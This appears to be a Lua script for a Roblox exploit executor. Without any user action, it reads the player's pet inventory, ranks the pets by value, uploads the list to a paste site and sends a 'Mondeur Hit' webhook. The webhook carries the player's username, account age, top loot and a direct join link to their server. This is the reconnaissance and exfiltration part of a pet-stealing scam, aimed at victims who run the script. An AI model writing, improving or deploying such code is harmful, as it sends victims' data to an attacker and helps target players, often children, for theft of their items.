local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

local function uploadLog(pets)
    if not requestFunc then return nil end
    local logData = "=== MONDEUR INVENTORY LOG ===\nPlayer: " .. LocalPlayer.Name .. "\n------------------------------\n"
    for i, p in ipairs(pets) do
        logData = logData .. "[" .. i .. "] " .. p.name .. " | Value: " .. tostring(p.value) .. "\n"
    end
    
    local ok, res = pcall(function()
        return requestFunc({
            Url = "https://sourceb.in/api/bins",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({files = {{content = logData}}})
        })
    end)
    
    if ok and res and res.StatusCode == 200 then
        local data = HttpService:JSONDecode(res.Body)
        if data and data.key then return "https://srcb.in/" .. data.key end
    end
    return nil
end

local function sendWebhook(pets, totalVal, totalCount)
    if not requestFunc then return end
    
    local binUrl = uploadLog(pets)
    local lootText = ""
    for i, p in ipairs(pets) do
        if i > 25 then break end
        lootText = lootText .. "> " .. p.name .. " : " .. tostring(p.value) .. "\n"
    end
    if lootText == "" then lootText = "Empty" end

    local p_info = "User: " .. LocalPlayer.Name .. "\nDisplay: " .. LocalPlayer.DisplayName .. "\nAge: " .. tostring(LocalPlayer.AccountAge) .. " Days"
    local v_stats = "Points: " .. tostring(totalVal) .. "\nPets: " .. tostring(totalCount)
    local s_link = "[Join App](roblox://placeID=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId) .. ")"
    local b_link = binUrl and "[View Log](" .. binUrl .. ")" or "Log Failed"

    local payload = HttpService:JSONEncode({
        username = "Mondeur",
        embeds = {{
            title = "Mondeur Hit",
            color = 3447003,
            fields = {
                {name = "Player Info", value = "```\n" .. p_info .. "\n```", inline = false},
                {name = "Stats", value = "```\n" .. v_stats .. "\n```", inline = true},
                {name = "Top Loot", value = "```\n" .. lootText .. "```", inline = false},
                {name = "Links", value = s_link .. " | " .. b_link, inline = false}
            }
        }}
    })

    pcall(function()
        requestFunc({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
    end)
end

task.spawn(function()
    task.wait(3) 
    local ok, inv = pcall(function() return GetInvAPI:InvokeServer() end)
    if not ok or not inv then return end

    local p_list = {}
    local t_val = 0
    local t_count = 0

    for id, item in pairs(inv) do
        if item.Kind == "Pet" then
            t_count = t_count + 1
            local db = InventoryDB.pets[item.id]
            local v = (item.properties and item.properties.value) or 0
            table.insert(p_list, {name = (db and db.name) or item.id, value = v})
            t_val = t_val + v
        end
    end

    table.sort(p_list, function(a, b) return a.value > b.value end)
    sendWebhook(p_list, t_val, t_count)
end)
